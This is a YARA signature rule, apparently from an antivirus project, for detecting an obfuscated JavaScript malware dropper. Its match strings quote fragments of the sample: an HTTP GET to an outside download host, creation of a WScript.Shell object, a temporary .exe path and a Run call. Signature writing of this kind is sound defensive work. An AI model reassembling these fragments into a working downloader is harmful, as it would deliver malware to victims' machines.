rule sig_20160401_55e5544a0f09f7ca47dbb84b6e02f548 {
  meta:
    description = "datamaliciousorder - file 20160401_55e5544a0f09f7ca47dbb84b6e02f548.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6d9013767c60d95beb5af915299a9f069238b0a0fc5c025a583b8f4110bed18e"

  strings:
    $s1  = "JtiMq[FaHts](\"G\" + \"ET\", \"http://be-stlines-tore.com/l9sape\", false);" fullword ascii
    $s2  = "function TpIrd(ZbZn, YxRns){SfqYoe = SfqYoe * 1; return ZbZn - YxRns;};" fullword ascii
    $s3  = "var IeAlj = function TqFm() {return WScript[ScXh](\"WScript\"+\".Shell\");}(), NfvKua = 11;" fullword ascii
    $s4  = "if (JtiMq[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DgeEb(){return TrsNcy + \"\";};" fullword ascii
    $s6  = "function DwxOs() {return IeAlj[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"jOEZhcNKOuUj.ex\" + \"e\";};" fullword ascii
    $s7  = "function LlmJz() {return ((JlnIl == true) && (JlnIl == FjDo)) ? 1 : SfqYoe;};" fullword ascii
    $s8  = "return TpIrd(GhiMv, XzmGr);" fullword ascii
    $s9  = "JlnIl = true; " fullword ascii
    $s10 = "function JzgSxi(ByLx) {var DvtGj = (1, 2, 3, 4, 5, ByLx); return DvtGj;};" fullword ascii
    $s11 = "var FjDo = false;" fullword ascii
    $s12 = "function UapQh()" fullword ascii
    $s13 = "function MmFpx(){return 23;};" fullword ascii
    $s14 = "FjDo = true; " fullword ascii
    $s15 = "var JlnIl = false;" fullword ascii
    $s16 = "function CnoXda(){return ScXh;};" fullword ascii
    $s17 = "var LeZc = new this[\"Date\"]();" fullword ascii
    $s18 = "}while (SnjKt);" fullword ascii
    $s19 = "var KfQav = false;" fullword ascii
    $s20 = "function MvFy(JsoYs){IeAlj[\"R\"+\"un\"](JsoYs, SfqYoe, SfqYoe);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}